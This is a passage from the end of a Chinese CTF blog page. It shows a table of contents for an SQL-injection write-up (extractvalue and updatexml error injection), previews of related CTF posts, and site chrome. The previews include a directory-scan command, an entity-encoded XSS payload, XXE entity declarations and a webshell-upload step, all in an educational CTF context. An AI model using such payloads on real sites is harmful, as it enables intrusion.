class="reward-item"><a href="/images/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/images/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/017dda7f.html" title="快速入门web-ssrf及buuctf西电题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">快速入门web-ssrf及buuctf西电题解</div></div><div class="info-2"><div class="info-item-1">快速入门web-ssrf及buuctf西电题解SSRF &#x3D; 服务器端请求伪造特点 主体是服务器：请求是「服务器发起」的，不是你的电脑； 权限是服务器的权限：服务器能访问的资源（本地文件、内网 IP），你本来访问不到，但通过 SSRF 就能间接访问； 核心是 “伪造请求”：你伪造一个服务器会执行的请求（比如本地文件地址、内网地址），服务器替你执行。  [网鼎杯 2018]Fakebook11.注册登陆界面，sqlmap扫描 1python dirsearch.py -u &quot;http://3992b9c4-b99e-44db-96b6-111d3cb92681.node5.buuoj.cn:81/&quot; -e php --threads 1 --delay 3 -w ./ctf_core.txt      打开备份文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123;    public $na...</div></div></div></a><a class="pagination-related" href="/posts/dac7711f.html" title="xxs知识点简短速记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">xxs知识点简短速记</div></div><div class="info-2"><div class="info-item-1">xxs知识点简短速记分类： 1.反射型（外部输入后，在浏览器端输出触发） 2.存储型（东西存在文件中，web程序读取代码并输出） 知识点1：html实体编码： HTML 实体编码 的规则是： &amp;# + 十进制 ASCII 码 + ;  字母 r 的十进制 ASCII 码是 114。 所以它的 HTML 实体编码就是 r。  CSRF：到底是什么？ 黑客没偷你的证件（他拿不到 Cookie）。 黑客只是骗你点了一下按钮（利用了你还在登录状态的权限）。 结果： 在你完全不知情的情况下，你的身份被黑客**“借用”**了。 举例： &lt;img= src=1 oner&amp;#114;or=ale&amp;#114;t(1)&gt; 知识点2：Referer 是看你从哪来。 Token 是看你带没带暗号。  Sec-Fetch  Sec: 是 Security（安全）的缩写。 Fetch: 翻译为 “获取” 或 “抓取”（在编程里指代发起一个网络请求）。 合起来的意思： “安全获取元数据”（Security Fetch Metadata）。  它是浏览器在发起请求时，自动给服...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/a8ae9de6.html" title="[BJDCTF2020]藏藏藏 1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-07</div><div class="info-item-2">[BJDCTF2020]藏藏藏 1</div></div><div class="info-2"><div class="info-item-1">[BJDCTF2020]藏藏藏 11.0110发现有pk压缩包，还有个docx  2.kali打开 2.1解析 1binwalk 图片.jpg  //解析得到存在zip  2.2分离 1foremost 图片.jpg //分离得到图片中的压缩包，默认在output目录里面  2.3解压 1unzip ./output/zip/文件名.zip   //得到 ：福利.docx  2.4查看 1cat 福利.docx  //又发现pk文件头  2.5binwalk检测，发现很多压缩包 2.6foremost分离，此时加后缀-t，放在另一个output中 2.7tree .&#x2F;新output 12345──(kali㉿kali)-[~/Desktop]└─$ tree ./output_Thu_Dec_18_08_56_09_2025/zip ./output_Thu_Dec_18_08_56_09_2025/zip└── 00000000.zip  2.8 解压unzip .&#x2F;output_Thu_Dec_18_08_56_09_2025&#x2F;zip&#x2F;...</div></div></div></a><a class="pagination-related" href="/posts/badcd591.html" title="ningen 1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-07</div><div class="info-item-2">ningen 1</div></div><div class="info-2"><div class="info-item-1">ningen1010打开发现有压缩包的标识， 拿到kali虚拟机里面，binwalk和foremost一下得到压缩包 密码既然提示了就爆破，得到密码即为zip文件解压密码 打开后获得flag  </div></div></div></a><a class="pagination-related" href="/posts/6647a695.html" title="快速入门xml在ctf中的运用及知识点"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-07</div><div class="info-item-2">快速入门xml在ctf中的运用及知识点</div></div><div class="info-2"><div class="info-item-1">快速入门xml在ctf中的运用及知识点  DOCTYPE（文档类型定义的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请）  123456内部实体&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt;外部实体&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;          10 第十章 天机符阵_revenge随便输入，得到： 12345&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML(): Start tag expected, &#x27;&amp;lt;&#x27; not found in Entity, line: 1 in &lt;b&gt;/var/www/html/chapter10.php&lt;/b&gt; on line &lt;b&gt;17&lt;/b&gt;&lt;br /&gt;&lt;阵枢&gt;引魂玉&lt;/阵枢&gt;&lt;解析&gt;未定义&lt;/解析&gt;&lt;输出&gt;...</div></div></div></a><a class="pagination-related" href="/posts/11f93cf4.html" title="[HNCTF 2022 Week1]easy_upload"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-07</div><div class="info-item-2">[HNCTF 2022 Week1]easy_upload</div></div><div class="info-2"><div class="info-item-1">[HNCTF 2022 Week1]easy_upload1.上传木马图 2.抓包改后缀  3.蚁剑连接 </div></div></div></a><a class="pagination-related" href="/posts/4c1c0735.html" title="爱因斯坦 1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-07</div><div class="info-item-2">爱因斯坦 1</div></div><div class="info-2"><div class="info-item-1">BUUCTF 爱因斯坦11.steglove发现  1......t. h.i.s._. i.s._.n. o.t._.p. a.s.s.w. o.r.d...    2.010发现pk压缩包 3.放kali里面 binwalk分析出压缩包 然后foremost分离 unzip解压 123456789101112131415161718192021222324┌──(kali㉿kali)-[~/Desktop]└─$ binwalk misc2.jpgDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             JPEG image data, JFIF standard 1.0130            0x1E            TIFF image data, big-endian, offset of first image di...</div></div></div></a><a class="pagination-related" href="/posts/152da731.html" title="moectf2025 catch"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-07</div><div class="info-item-2">moectf2025 catch</div></div><div class="info-2"><div class="info-item-1">moectf2025 catch知识点：1.ROT13ROT13 的全称是 Rotate by 13 places（循环右移13位）。 字母表一共有 26 个字母，13 恰好是它的一半。这个加密方法就是把字母表对折：  A 变成第 14 个字母 N B 变成第 15 个字母 O …以此类推  它的特点是：  对称性：如果你对一个词做两次 ROT13，它就会变回原样。 只换字母：数字（如 4）、符号（如 {、_）完全不受影响。  题目提示：IDA pro 9.0 推出了针对 C++ exception 的优化 但是这并不意味着所有的 try catch 都能被正确反编译  查找字符串发现了疑似flag的字符串还有一个try to catch me .data:0000000140027120	00000027	C	zbrpgs{F4z3_Ge1px_jvgu_@sybjre_qrfhjn} 既然题目提示了catch，我们去找到try to catch me的位置，一探究竟 try to catch me1234567891011 printf(&quot;try to catch ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">qyt</div><div class="author-info-description">不要放弃自由去选择保障，到头来你两者都得不到</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/2829750658t-svg" target="_blank" title="GitHub"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.zhihu.com/people/7e5acf574f89c3cba9460c739673e2cf" target="_blank" title="知乎"><i class="fab fa-zhihu"></i></a><a class="social-icon" href="https://xhslink.com/m/2t0Ndc1uvYL" target="_blank" title="小红书"><i class="fas fa-notes-medical"></i></a><a class="social-icon" href="https://163cn.tv/Z9ohElT" target="_blank" title="网易云音乐"><i class="fas fa-music"></i></a><a class="social-icon" href="https://www.instagram.com/tenyeahqweyeah?igsh=NG92enl2NTE0NGMx&amp;utm_source=qr" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">很高兴能向你展示我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8web-sql%E6%B3%A8%E5%85%A5%E5%8F%8Abuuctf%E8%A5%BF%E7%94%B5%E9%A2%98%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">快速入门web-sql注入及buuctf西电题解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#08-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3-%E9%A2%98%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">08 第八章 天衍真言，星图显圣 题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-number">1.2.</span> <span class="toc-text">[极客大挑战 2019]HardSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">问题：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E9%9C%80%E8%A6%81-UNION-SELECT%EF%BC%9F"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">1. 报错注入为什么不需要 UNION SELECT？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8-or-%E8%80%8C%E4%B8%8D%E6%98%AF-and%EF%BC%9F"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">2. 注入中为什么用 or 而不是 and？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#right-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="toc-number">1.2.3.</span> <span class="toc-text">right() 函数的语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8Bextractvalue"><span class="toc-number">1.2.4.</span> <span class="toc-text">举例extractvalue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-extractvalue-%E5%87%BD%E6%95%B0%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.5.</span> <span class="toc-text">1. extractvalue() 函数结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9E%84%E9%80%A0-Payload-%E7%9A%84%E9%80%BB%E8%BE%91"><span class="toc-number">1.2.6.</span> <span class="toc-text">2. 构造 Payload 的逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%BA%94%E5%AF%B9-32-%E4%BD%8D%E9%99%90%E5%88%B6%EF%BC%88%E7%BF%BB%E9%A1%B5%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="toc-number">1.2.7.</span> <span class="toc-text">3. 应对 32 位限制（翻页读取）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-updatexml-vs-extractvalue-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.2.8.</span> <span class="toc-text">4. updatexml() vs extractvalue() 的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-5%E9%A2%98%E8%A7%A3"><span class="toc-number">1.3.</span> <span class="toc-text">sqli-5题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU2019-Web1"><span class="toc-number">1.4.</span> <span class="toc-text">[SWPU2019]Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">1</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/e2b06f23.html" title="reverse1">reverse1</a><time datetime="2026-03-07T07:03:51.000Z" title="发表于 2026-03-07 15:03:51">2026-03-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f8cca232.html" title="reverse2">reverse2</a><time datetime="2026-03-07T07:03:51.000Z" title="发表于 2026-03-07 15:03:51">2026-03-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/5828cfdd.html" title="xor 1">xor 1</a><time datetime="2026-03-07T07:03:51.000Z" title="发表于 2026-03-07 15:03:51">2026-03-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f11be5b3.html" title="内涵的软件1">内涵的软件1</a><time datetime="2026-03-07T07:03:51.000Z" title="发表于 2026-03-07 15:03:51">2026-03-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/77de94ea.html" title="新年快乐 1">新年快乐 1</a><time datetime="2026-03-07T07:03:51.000Z" title="发表于 2026-03-07 15:03:51">2026-03-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By qyt</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': '2829750658t-svg/2829750658t-svg.github.io',
+      'data-repo-id': 'R_kgDOQS61dQ',
+      'data-category-id': 'DIC_kwDOQS61dc4C1UR-',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
